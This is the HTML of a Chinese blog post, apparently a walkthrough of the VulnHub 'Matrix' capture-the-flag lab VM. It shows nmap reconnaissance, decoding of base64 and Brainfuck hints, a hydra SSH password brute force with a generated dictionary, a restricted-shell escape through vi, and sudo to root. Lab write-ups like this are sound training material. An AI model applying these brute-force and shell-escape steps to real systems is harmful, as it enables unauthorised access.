@@ -1,0 +1,730 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="渗透测试," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="Matrix靶机是一个Matrix靶机是一个Matrix是一个中等难度的boot2root挑战，该文件已被在Vmware和Virtual box上测试通过。 靶机描述目标：你的目标是获取root权限并读取/root/flag.txt网络：DHCP:可用的IP地址:自动分配提示：搞就完事了作者Twiiter：@unknowndevice64 下载地址https://www.vulnhub.com/e">
+<meta name="keywords" content="渗透测试">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Matrix靶机实战演练">
+<meta property="og:url" content="https://yyhylh.github.io/2019/02/21/Matrix靶机实战演练/index.html">
+<meta property="og:site_name" content="LLLH">
+<meta property="og:description" content="Matrix靶机是一个Matrix靶机是一个Matrix是一个中等难度的boot2root挑战，该文件已被在Vmware和Virtual box上测试通过。 靶机描述目标：你的目标是获取root权限并读取/root/flag.txt网络：DHCP:可用的IP地址:自动分配提示：搞就完事了作者Twiiter：@unknowndevice64 下载地址https://www.vulnhub.com/e">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://uploader.shimo.im/f/D0cePvaM6tUm9Tj0.png!thumbnail">
+<meta property="og:image" content="https://uploader.shimo.im/f/AEAAZUT7AgEOIGgW.png!thumbnail">
+<meta property="og:image" content="https://uploader.shimo.im/f/HBYd0zUfaiED1VC2.png!thumbnail">
+<meta property="og:updated_time" content="2019-02-21T08:02:11.514Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Matrix靶机实战演练">
+<meta name="twitter:description" content="Matrix靶机是一个Matrix靶机是一个Matrix是一个中等难度的boot2root挑战，该文件已被在Vmware和Virtual box上测试通过。 靶机描述目标：你的目标是获取root权限并读取/root/flag.txt网络：DHCP:可用的IP地址:自动分配提示：搞就完事了作者Twiiter：@unknowndevice64 下载地址https://www.vulnhub.com/e">
+<meta name="twitter:image" content="https://uploader.shimo.im/f/D0cePvaM6tUm9Tj0.png!thumbnail">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":true},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://yyhylh.github.io/2019/02/21/Matrix靶机实战演练/"/>
+
+
+
+
+
+  <title>Matrix靶机实战演练 | LLLH</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">LLLH</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">恰逢适会</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://yyhylh.github.io/2019/02/21/Matrix靶机实战演练/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="LH">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="LLLH">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Matrix靶机实战演练</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-02-21T09:32:40+08:00">
+                2019-02-21
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>Matrix靶机是一个Matrix靶机是一个Matrix是一个中等难度的boot2root挑战，该文件已被在Vmware和Virtual box上测试通过。</p>
+<h1 id="靶机描述"><a href="#靶机描述" class="headerlink" title="靶机描述"></a>靶机描述</h1><p>目标：你的目标是获取root权限并读取/root/flag.txt<br>网络：DHCP:可用的IP地址:自动分配<br>提示：搞就完事了<br>作者Twiiter：@unknowndevice64</p>
+<h1 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h1><p><a href="https://www.vulnhub.com/entry/matrix-1,259/" target="_blank" rel="external">https://www.vulnhub.com/entry/matrix-1,259/</a></p>
+<h1 id="实战演练"><a href="#实战演练" class="headerlink" title="实战演练"></a>实战演练</h1><p>首先配置环境，在vulnhub下载下来后，在电脑安装了VirtualBox的情况下直接双击ovf文件，即可自动在Virtualbox里进行安装，但是需要提前配置好虚拟网卡和DHCP服务器。</p>
+<p><img src="https://uploader.shimo.im/f/D0cePvaM6tUm9Tj0.png!thumbnail" alt="图片"></p>
+<p>配置完成后打开虚拟机即可。打开后可以看到如下界面，即配置完成。</p>
+<p><img src="https://uploader.shimo.im/f/AEAAZUT7AgEOIGgW.png!thumbnail" alt="图片"> </p>
+<p>配置好就可以开始实战了。<br>首先确定了目标地址是服务器后的第一台主机，即IP为192.168.56.101。用nmap扫一下。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">root@kali:~# nmap 192.168.56.101 -A</div><div class="line"></div><div class="line">Starting Nmap 7.50 ( https://nmap.org ) at 2019-02-19 14:33 CST</div><div class="line">Nmap scan report for 192.168.56.101</div><div class="line">Host is up (0.0037s latency).</div><div class="line">Not shown: 997 closed ports</div><div class="line">PORT      STATE SERVICE VERSION</div><div class="line">22/tcp    open  ssh     OpenSSH 7.7 (protocol 2.0)</div><div class="line">| ssh-hostkey: </div><div class="line">|   2048 9c:8b:c7:7b:48:db:db:0c:4b:68:69:80:7b:12:4e:49 (RSA)</div><div class="line">|   256 49:6c:23:38:fb:79:cb:e0:b3:fe:b2:f4:32:a2:70:8e (ECDSA)</div><div class="line">|_  256 53:27:6f:04:ed:d1:e7:81:fb:00:98:54:e6:00:84:4a (EdDSA)</div><div class="line">80/tcp    open  http    SimpleHTTPServer 0.6 (Python 2.7.14)</div><div class="line">|_http-server-header: SimpleHTTP/0.6 Python/2.7.14</div><div class="line">|_http-title: Welcome in Matrix</div><div class="line">31337/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.14)</div><div class="line">|_http-server-header: SimpleHTTP/0.6 Python/2.7.14</div><div class="line">|_http-title: Welcome in Matrix</div><div class="line">Device type: firewall</div><div class="line">Running (JUST GUESSING): Fortinet embedded (92%)</div><div class="line">OS CPE: cpe:/h:fortinet:fortigate_200b</div><div class="line">Aggressive OS guesses: Fortinet FortiGate 200B firewall (92%)</div><div class="line">No exact OS matches for host (test conditions non-ideal).</div><div class="line">Network Distance: 1 hop</div><div class="line"></div><div class="line">TRACEROUTE (using port 80/tcp)</div><div class="line">HOP RTT     ADDRESS</div><div class="line">1   0.26 ms 192.168.56.101</div><div class="line"></div><div class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</div><div class="line">Nmap done: 1 IP address (1 host up) scanned in 13.93 seconds</div></pre></td></tr></table></figure>
+<p> 服务器开了一个22的ssh端口和两个web端口，分别curl80端口和31337端口，在31337端口的回显里发现如下信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;!--p class=&quot;service__text&quot;&gt;ZWNobyAiVGhlbiB5b3UnbGwgc2VlLCB0aGF0IGl0IGlzIG5vdCB0aGUgc3Bvb24gdGhhdCBiZW5kcywgaXQgaXMgb25seSB5b3Vyc2VsZi4gIiA+IEN5cGhlci5tYXRyaXg=&lt;/p--&gt;</div></pre></td></tr></table></figure>
+<p>尝试用base64解码，得到如下明文</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">root@kali:~# echo &apos;ZWNobyAiVGhlbiB5b3UnbGwgc2VlLCB0aGF0IGl0IGlzIG5vdCB0aGUgc3Bvb24gdGhhdCBiZW5kcywgaXQgaXMgb25seSB5b3Vyc2VsZi4gIiA+IEN5cGhlci5tYXRyaXg=&apos; |base64 -d</div></pre></td></tr></table></figure>
+<p>echo “Then you’ll see, that it is not the spoon that bends, it is only yourself. “ &gt; Cypher.matrix</p>
+<p>看起来像是一句命令，把一句话写入了一个文件<code>Cypher.matrix</code>。在服务器上寻找此文件，输入<a href="http://192.168.56.101:31337/Cypher.matrix，成功下载到这个文件，打开后内容如下" target="_blank" rel="external">http://192.168.56.101:31337/Cypher.matrix，成功下载到这个文件，打开后内容如下</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div></pre></td><td class="code"><pre><div class="line">+++++ ++++[ -&gt;+++ +++++ +&lt;]&gt;+ +++++ ++.&lt;+ +++[- &gt;++++ &lt;]&gt;++ ++++. +++++</div><div class="line">+.&lt;++ +++++ ++[-&gt; ----- ----&lt; ]&gt;--- -.&lt;++ +++++ +[-&gt;+ +++++ ++&lt;]&gt; +++.-</div><div class="line">-.&lt;++ +[-&gt;+ ++&lt;]&gt; ++++. &lt;++++ ++++[ -&gt;--- ----- &lt;]&gt;-- ----- ----- --.&lt;+</div><div class="line">+++++ ++[-&gt; +++++ +++&lt;] &gt;++++ +.+++ +++++ +.+++ +++.&lt; +++[- &gt;---&lt; ]&gt;---</div><div class="line">---.&lt; +++[- &gt;+++&lt; ]&gt;+++ +.&lt;++ +++++ ++[-&gt; ----- ----&lt; ]&gt;-.&lt; +++++ +++[-</div><div class="line">&gt;++++ ++++&lt; ]&gt;+++ +++++ +.+++ ++.++ ++++. ----- .&lt;+++ +++++ [-&gt;-- -----</div><div class="line">-&lt;]&gt;- ----- ----- ----. &lt;++++ ++++[ -&gt;+++ +++++ &lt;]&gt;++ +++++ +++++ +.&lt;++</div><div class="line">+[-&gt;- --&lt;]&gt; ---.&lt; ++++[ -&gt;+++ +&lt;]&gt;+ ++.-- .---- ----- .&lt;+++ [-&gt;++ +&lt;]&gt;+</div><div class="line">+++++ .&lt;+++ +++++ +[-&gt;- ----- ---&lt;] &gt;---- ---.&lt; +++++ +++[- &gt;++++ ++++&lt;</div><div class="line">]&gt;+.&lt; ++++[ -&gt;+++ +&lt;]&gt;+ +.&lt;++ +++++ ++[-&gt; ----- ----&lt; ]&gt;--. &lt;++++ ++++[</div><div class="line">-&gt;+++ +++++ &lt;]&gt;++ +++++ .&lt;+++ [-&gt;++ +&lt;]&gt;+ ++++. &lt;++++ [-&gt;-- --&lt;]&gt; .&lt;+++</div><div class="line">[-&gt;++ +&lt;]&gt;+ ++++. +.&lt;++ +++++ +[-&gt;- ----- --&lt;]&gt; ----- ---.&lt; +++[- &gt;---&lt;</div><div class="line">]&gt;--- .&lt;+++ +++++ +[-&gt;+ +++++ +++&lt;] &gt;++++ ++.&lt;+ ++[-&gt; ---&lt;] &gt;---- -.&lt;++</div><div class="line">+[-&gt;+ ++&lt;]&gt; ++.&lt;+ ++[-&gt; ---&lt;] &gt;---. &lt;++++ ++++[ -&gt;--- ----- &lt;]&gt;-- -----</div><div class="line">-.&lt;++ +++++ +[-&gt;+ +++++ ++&lt;]&gt; +++++ +++++ +++++ +.&lt;++ +[-&gt;- --&lt;]&gt; -----</div><div class="line">-.&lt;++ ++[-&gt; ++++&lt; ]&gt;++. .++++ .---- ----. +++.&lt; +++[- &gt;---&lt; ]&gt;--- --.&lt;+</div><div class="line">+++++ ++[-&gt; ----- ---&lt;] &gt;---- .&lt;+++ +++++ [-&gt;++ +++++ +&lt;]&gt;+ +++++ +++++</div><div class="line">.&lt;+++ ++++[ -&gt;--- ----&lt; ]&gt;--- ----- -.&lt;++ +++++ [-&gt;++ +++++ &lt;]&gt;++ +++++</div><div class="line">+++.. &lt;++++ +++[- &gt;---- ---&lt;] &gt;---- ----- --.&lt;+ +++++ ++[-&gt; +++++ +++&lt;]</div><div class="line">&gt;++.&lt; +++++ [-&gt;-- ---&lt;] &gt;-..&lt; +++++ +++[- &gt;---- ----&lt; ]&gt;--- ----- ---.-</div><div class="line">--.&lt;+ +++++ ++[-&gt; +++++ +++&lt;] &gt;++++ .&lt;+++ ++[-&gt; +++++ &lt;]&gt;++ +++++ +.+++</div><div class="line">++.&lt;+ ++[-&gt; ---&lt;] &gt;---- --.&lt;+ +++++ [-&gt;-- ----&lt; ]&gt;--- ----. &lt;++++ +[-&gt;-</div><div class="line">----&lt; ]&gt;-.&lt; +++++ [-&gt;++ +++&lt;] &gt;++++ ++++. &lt;++++ +[-&gt;+ ++++&lt; ]&gt;+++ +++++</div><div class="line">+.&lt;++ ++[-&gt; ++++&lt; ]&gt;+.+ .&lt;+++ +[-&gt;- ---&lt;] &gt;---- .&lt;+++ [-&gt;++ +&lt;]&gt;+ +..&lt;+</div><div class="line">++[-&gt; +++&lt;] &gt;++++ .&lt;+++ +++++ [-&gt;-- ----- -&lt;]&gt;- ----- ----- --.&lt;+ ++[-&gt;</div><div class="line">---&lt;] &gt;---. &lt;++++ ++[-&gt; +++++ +&lt;]&gt;+ ++++. &lt;++++ ++[-&gt; ----- -&lt;]&gt;- ----.</div><div class="line">&lt;++++ ++++[ -&gt;+++ +++++ &lt;]&gt;++ ++++. +++++ ++++. +++.&lt; +++[- &gt;---&lt; ]&gt;--.</div><div class="line">--.&lt;+ ++[-&gt; +++&lt;] &gt;++++ ++.&lt;+ +++++ +++[- &gt;---- ----- &lt;]&gt;-- -.&lt;++ +++++</div><div class="line">+[-&gt;+ +++++ ++&lt;]&gt; +++++ +++++ ++.&lt;+ ++[-&gt; ---&lt;] &gt;--.&lt; ++++[ -&gt;+++ +&lt;]&gt;+</div><div class="line">+.+.&lt; +++++ ++++[ -&gt;--- ----- -&lt;]&gt;- --.&lt;+ +++++ +++[- &gt;++++ +++++ &lt;]&gt;++</div><div class="line">+.+++ .---- ----. &lt;++++ ++++[ -&gt;--- ----- &lt;]&gt;-- ----- ----- ---.&lt; +++++</div><div class="line">+++[- &gt;++++ ++++&lt; ]&gt;+++ .++++ +.--- ----. &lt;++++ [-&gt;++ ++&lt;]&gt; +.&lt;++ ++[-&gt;</div><div class="line">----&lt; ]&gt;-.+ +.&lt;++ ++[-&gt; ++++&lt; ]&gt;+.&lt; +++[- &gt;---&lt; ]&gt;--- ---.&lt; +++[- &gt;+++&lt;</div><div class="line">]&gt;+++ +.+.&lt; +++++ ++++[ -&gt;--- ----- -&lt;]&gt;- -.&lt;++ +++++ ++[-&gt; +++++ ++++&lt;</div><div class="line">]&gt;++. ----. &lt;++++ ++++[ -&gt;--- ----- &lt;]&gt;-- ----- ----- ---.&lt; +++++ +[-&gt;+</div><div class="line">+++++ &lt;]&gt;++ +++.&lt; +++++ +[-&gt;- ----- &lt;]&gt;-- ---.&lt; +++++ +++[- &gt;++++ ++++&lt;</div><div class="line">]&gt;+++ +++++ .---- ---.&lt; ++++[ -&gt;+++ +&lt;]&gt;+ ++++. &lt;++++ [-&gt;-- --&lt;]&gt; -.&lt;++</div><div class="line">+++++ +[-&gt;- ----- --&lt;]&gt; ----- .&lt;+++ +++++ +[-&gt;+ +++++ +++&lt;] &gt;+.&lt;+ ++[-&gt;</div><div class="line">---&lt;] &gt;---- .&lt;+++ [-&gt;++ +&lt;]&gt;+ +.--- -.&lt;++ +[-&gt;- --&lt;]&gt; --.++ .++.- .&lt;+++</div><div class="line">+++++ [-&gt;-- ----- -&lt;]&gt;- ---.&lt; +++++ ++++[ -&gt;+++ +++++ +&lt;]&gt;+ +++++ .&lt;+++</div><div class="line">[-&gt;-- -&lt;]&gt;- ----. &lt;+++[ -&gt;+++ &lt;]&gt;++ .&lt;+++ [-&gt;-- -&lt;]&gt;- --.&lt;+ +++++ ++[-&gt;</div><div class="line">----- ---&lt;] &gt;---- ----. &lt;++++ +++[- &gt;++++ +++&lt;] &gt;++++ +++.. &lt;++++ +++[-</div><div class="line">&gt;---- ---&lt;] &gt;---- ---.&lt; +++++ ++++[ -&gt;+++ +++++ +&lt;]&gt;+ ++.-- .++++ +++.&lt;</div><div class="line">+++++ ++++[ -&gt;--- ----- -&lt;]&gt;- ----- --.&lt;+ +++++ +++[- &gt;++++ +++++ &lt;]&gt;++</div><div class="line">+++++ +.&lt;++ +[-&gt;- --&lt;]&gt; -.+++ +++.- --.&lt;+ +++++ +++[- &gt;---- ----- &lt;]&gt;-.</div><div class="line">&lt;++++ ++++[ -&gt;+++ +++++ &lt;]&gt;++ +++++ +++++ .++++ +++++ .&lt;+++ +[-&gt;- ---&lt;]</div><div class="line">&gt;--.+ +++++ ++.&lt;+ +++++ ++[-&gt; ----- ---&lt;] &gt;---- ----- --.&lt;+ +++++ ++[-&gt;</div><div class="line">+++++ +++&lt;] &gt;+.&lt;+ ++[-&gt; +++&lt;] &gt;++++ .&lt;+++ [-&gt;-- -&lt;]&gt;- .&lt;+++ +++++ [-&gt;--</div><div class="line">----- -&lt;]&gt;- ---.&lt; +++++ +++[- &gt;++++ ++++&lt; ]&gt;+++ +++.+ ++.++ +++.&lt; +++[-</div><div class="line">&gt;---&lt; ]&gt;-.&lt; +++++ +++[- &gt;---- ----&lt; ]&gt;--- -.&lt;++ +++++ +[-&gt;+ +++++ ++&lt;]&gt;</div><div class="line">+++.&lt; +++[- &gt;+++&lt; ]&gt;+++ .+++. .&lt;+++ [-&gt;-- -&lt;]&gt;- ---.- -.&lt;++ ++[-&gt; ++++&lt;</div><div class="line">]&gt;+.&lt; +++++ ++++[ -&gt;--- ----- -&lt;]&gt;- --.&lt;+ +++++ +++[- &gt;++++ +++++ &lt;]&gt;++</div><div class="line">.+.-- .---- ----- .++++ +.--- ----. &lt;++++ ++++[ -&gt;--- ----- &lt;]&gt;-- -----</div><div class="line">.&lt;+++ +++++ [-&gt;++ +++++ +&lt;]&gt;+ +++++ +++++ ++++. ----- ----. &lt;++++ ++++[</div><div class="line">-&gt;--- ----- &lt;]&gt;-- ----. &lt;++++ ++++[ -&gt;+++ +++++ &lt;]&gt;++ +++++ +++++ ++++.</div><div class="line">&lt;+++[ -&gt;--- &lt;]&gt;-- ----. &lt;++++ [-&gt;++ ++&lt;]&gt; ++..+ +++.- ----- --.++ +.&lt;++</div><div class="line">+[-&gt;- --&lt;]&gt; ----- .&lt;+++ ++++[ -&gt;--- ----&lt; ]&gt;--- --.&lt;+ ++++[ -&gt;--- --&lt;]&gt;</div><div class="line">----- ---.- --.&lt;</div></pre></td></tr></table></figure>
+<p>猜测是一段brainfuck代码，使用在线网站<a href="https://copy.sh/brainfuck/" target="_blank" rel="external">https://copy.sh/brainfuck/</a>进行解码，解码得到如下文字</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">You can enter into matrix as guest, with password k1ll0rXX</div><div class="line"></div><div class="line">Note: Actually, I forget last two characters so I have replaced with XX try your luck and find correct string of password.</div></pre></td></tr></table></figure>
+<p>猜测<code>guest</code>为登陆ssh的用户名，<code>k1ll0rXX</code>为密码，其中最后两位需要爆破。<br>首先用python生成字典</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">import string</div><div class="line">for i in string.printable[:-6]:</div><div class="line">    for j in string.printable[:-6]:</div><div class="line">        print &apos;k1ll0r&apos;+i+j</div></pre></td></tr></table></figure>
+<p>输出到<code>dic.txt</code>中，然后使用hydra进行爆破</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">root@kali:~# hydra -l guest -P dic.txt  -t 5 -vV 192.168.56.101 ssh</div><div class="line"></div><div class="line">...</div><div class="line"></div><div class="line">[ATTEMPT] target 192.168.56.101 - login &quot;guest&quot; - pass &quot;k1ll0r7l&quot; - 680 of 8836 [child 1] (0/0)</div><div class="line">[ATTEMPT] target 192.168.56.101 - login &quot;guest&quot; - pass &quot;k1ll0r7m&quot; - 681 of 8836 [child 3] (0/0)</div><div class="line">[ATTEMPT] target 192.168.56.101 - login &quot;guest&quot; - pass &quot;k1ll0r7n&quot; - 682 of 8836 [child 3] (0/0)</div><div class="line">[22][ssh] host: 192.168.56.101   login: guest   password: k1ll0r7n</div><div class="line">[STATUS] attack finished for 192.168.56.101 (waiting for children to complete tests)</div><div class="line">1 of 1 target successfully completed, 1 valid password found</div><div class="line">Hydra (http://www.thc.org/thc-hydra) finished at 2019-02-19 15:06:35</div></pre></td></tr></table></figure>
+<p>爆破得到密码为<code>k1ll0r7n</code>。<br>ssh登陆成功，然后尝试了一些命令，发现很多被限制或是过滤了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">guest@porteus:~$ sudo su</div><div class="line">-rbash: sudo: command not found</div><div class="line">guest@porteus:~$ ls</div><div class="line">-rbash: /bin/ls: restricted: cannot specify `/&apos; in command names</div></pre></td></tr></table></figure>
+<p>需要更多的可用命令进行提权<br>发现vi可用，想到可以用vi来启动一个bash，并不退出vi。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">:!/bin/bash</div><div class="line">~                                                                               </div><div class="line">~                                                                               </div><div class="line">bash: grep: command not found</div><div class="line">bash: ps: command not found</div><div class="line">bash: ps: command not found</div><div class="line">bash: ps: command not found</div><div class="line">bash: ps: command not found</div><div class="line">bash: ps: command not found</div><div class="line">bash: ps: command not found</div></pre></td></tr></table></figure>
+<p>发现还是有很多命令用不了，用<code>echo</code>看一下环境变量</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">guest@porteus:~$ echo $PATH</div><div class="line">/home/guest/prog</div></pre></td></tr></table></figure>
+<p>使用<code>export</code>命令添加环境变量</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">guest@porteus:~$ export PATH=/usr/bin:/bin</div><div class="line">guest@porteus:~$ echo $PATH</div><div class="line">/usr/bin:/bin</div></pre></td></tr></table></figure>
+<p>尝试提权，密码仍使用之前的密码<code>k1ll0r7n</code>，进入root目录，找到flag.txt。演练完成。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">guest@porteus:~$ sudo su</div><div class="line">Password: </div><div class="line">You do that again and see what happens...</div><div class="line">Password: </div><div class="line">root@porteus:/home/guest# </div><div class="line">root@porteus:/home/guest# cd /root/</div><div class="line">root@porteus:~# ls</div><div class="line">Desktop/  Documents/  Downloads/  Music/  Pictures/  Public/  Videos/  flag.txt</div><div class="line">root@porteus:~# cat flag.txt </div><div class="line">   _,-.                                                             </div><div class="line">,-&apos;  _|                  EVER REWIND OVER AND OVER AGAIN THROUGH THE</div><div class="line">|_,-O__`-._              INITIAL AGENT SMITH/NEO INTERROGATION SCENE</div><div class="line">|`-._\`.__ `_.           IN THE MATRIX AND BEAT OFF                 </div><div class="line">|`-._`-.\,-&apos;_|  _,-&apos;.                                               </div><div class="line">     `-.|.-&apos; | |`.-&apos;|_     WHAT                                     </div><div class="line">        |      |_|,-&apos;_`.                                            </div><div class="line">              |-._,-&apos;  |     NO, ME NEITHER                         </div><div class="line">         jrei | |    _,&apos;                                            </div><div class="line">#               &apos;-|_,-&apos;          IT&apos;S JUST A HYPOTHETICAL QUESTION</div></pre></td></tr></table></figure>
+<p>流程总结<br><img src="https://uploader.shimo.im/f/HBYd0zUfaiED1VC2.png!thumbnail" alt="图片"></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/渗透测试/" rel="tag"># 渗透测试</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
